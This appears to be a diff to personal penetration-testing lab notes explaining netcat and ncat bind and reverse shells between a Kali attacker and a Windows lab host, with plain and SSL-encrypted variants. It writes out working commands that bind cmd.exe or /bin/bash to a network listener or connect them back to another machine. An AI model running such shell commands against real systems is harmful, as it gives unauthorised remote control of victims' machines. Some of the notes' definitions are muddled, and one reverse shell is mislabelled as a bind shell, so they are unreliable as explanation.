@@ -1,3 +1,5 @@
+bind shell means from attacker machine to take control of victim machine called bind shell--- simple word get control of cmd.exe 
+reverse shell means victim machine start conversation with attaker machine--- in simple language get control of /bin/bash 
 Assume Bob is Windows machine(10.11.22.20) and Alice is Kali linux (tap0 address 10.11.0.204):
 1) bind shell from kali linux to windows:
 Alice:
@@ -25,3 +27,17 @@ nc -nlvp  4444 -e /bin/bash
 Bob:
 nc -nv 10.11.0.204 4444
  in reverse shell cases windows will have access of kali machine.
+
+-------------------------------------------------------------------------------------
+Now how to create secure ssl connection:
+
+1) bind shell:
+this will give you control of windows cmd prompt but BOB is server here.
+Bob: ncat --exec cmd.exe --allow 10.11.0.204 -vnl 4444 --ssl
+Alice: ncat -v 10.11.22.20 4444 --ssl
+
+2) bind shell:
+this case  Alice is srever but still we have cmd.exe access
+
+Alice(kali): ncat --allow 10.11.22.20 -nvlp 4444 --ssl
+bob:(windows): ncat -nv 10.11.0.204 4444 --ssl --exe cmd.exe
